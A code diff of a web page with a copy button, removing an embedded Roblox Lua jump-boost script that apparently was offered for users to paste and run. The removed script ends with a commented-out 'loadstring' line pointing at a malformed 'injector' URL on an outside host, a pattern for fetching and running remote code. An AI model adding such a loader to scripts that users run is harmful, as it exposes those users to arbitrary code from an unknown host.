@@ -56,47 +56,7 @@
   </div>
 
   <script>
-    const aeScript = `"local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local hrp = character:WaitForChild("HumanoidRootPart")
-local humanoid = character:WaitForChild("Humanoid")
-
--- Configuration
-local jumpStrength = 115
-local canJump = true
-
-
-local attachment = Instance.new("Attachment", hrp)
-local vForce = Instance.new("VectorForce", hrp)
-vForce.Attachment0 = attachment
-vForce.Force = Vector3.new(0, 0, 0)
-vForce.RelativeTo = Enum.ActuatorRelativeTo.World
-
-UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    
-    if input.KeyCode == Enum.KeyCode.Space and canJump then
- 
-        if humanoid.FloorMaterial ~= Enum.Material.Air then
-            canJump = false
-            
-            -- Apply the upward force based on mass (makes it consistent)
-            local mass = hrp.AssemblyMass
-            vForce.Force = Vector3.new(0, jumpStrength * mass, 0)
-            
-         
-            task.wait(0.1)
-            vForce.Force = Vector3.new(0, 0, 0)
-            
-            task.wait(0.4)
-            canJump = true
-        --loadstring()httpswa://injector-etn4gizuf-hnjutyuts-projects.vercel.app/lua.lua
-        end
-    end
-end)
+    const aeScript = `"
 `;
 
     document.getElementById('copyBtn').addEventListener('click', () => {
